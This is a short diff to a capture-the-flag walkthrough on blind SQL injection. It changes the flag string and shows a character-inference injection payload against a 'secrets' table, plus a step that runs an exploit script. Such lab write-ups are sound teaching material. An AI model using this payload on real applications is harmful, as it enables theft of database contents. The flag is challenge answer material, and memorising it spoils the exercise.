@@ -10,7 +10,7 @@ Walkthrough
 2. Construct character inference queries:
    `admin' AND SUBSTR((SELECT secret_val FROM secrets LIMIT 1), 1, 1) = 'b' --`
 3. Run `challenge/app/exploit_demo.py` to extract all characters.
-4. Output: `flag{blind_sql_inference}`.
+4. Output: `flag{blind sql inference}`.
 
 Flag  
-`flag{blind_sql_inference}`
+`flag{blind sql inference}`
